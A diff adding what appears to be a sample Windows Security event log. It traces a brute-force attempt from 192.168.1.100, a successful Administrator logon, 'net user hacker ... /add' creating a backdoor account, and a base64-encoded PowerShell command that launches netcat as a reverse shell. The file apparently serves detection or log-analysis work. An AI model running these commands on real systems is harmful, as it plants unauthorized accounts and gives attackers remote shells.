@@ -1,0 +1,53 @@
+[EventLog][Security] Event ID: 4625
+Time: 2023-12-01 03:15:22
+Type: Failure Audit
+User: john.doe
+Workstation: DESKTOP-XYZ123
+Reason: Invalid credentials
+Source IP: 192.168.1.100
+
+[EventLog][Security] Event ID: 4625
+Time: 2023-12-01 03:15:45
+Type: Failure Audit
+User: john.doe
+Workstation: DESKTOP-XYZ123
+Reason: Invalid credentials
+Source IP: 192.168.1.100
+
+[EventLog][Security] Event ID: 4625
+Time: 2023-12-01 03:16:02
+Type: Failure Audit
+User: john.doe
+Workstation: DESKTOP-XYZ123
+Reason: Invalid credentials
+Source IP: 192.168.1.100
+
+[EventLog][Security] Event ID: 4625
+Time: 2023-12-01 03:16:30
+Type: Failure Audit
+User: Administrator
+Workstation: DESKTOP-XYZ123
+Reason: Invalid credentials
+Source IP: 192.168.1.100
+
+[EventLog][Security] Event ID: 4624
+Time: 2023-12-01 03:18:45
+Type: Success Audit
+User: Administrator
+Workstation: DESKTOP-XYZ123
+Logon Type: 3 (Network)
+Source IP: 192.168.1.100
+
+[EventLog][Security] Event ID: 4688
+Time: 2023-12-01 03:20:12
+Type: Process Creation
+User: Administrator
+Process: C:\Windows\System32\cmd.exe
+CommandLine: cmd.exe /c net user hacker Password123! /add
+
+[EventLog][Security] Event ID: 4688
+Time: 2023-12-01 03:21:05
+Type: Process Creation
+User: Administrator
+Process: C:\Windows\System32\powershell.exe
+CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABuAGUAdABjAGEAdAAuAGUAeABlACAAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAgADQANAA0ADQAIAAtAGUAIABjAG0AZAAuAGUAeABlAA==
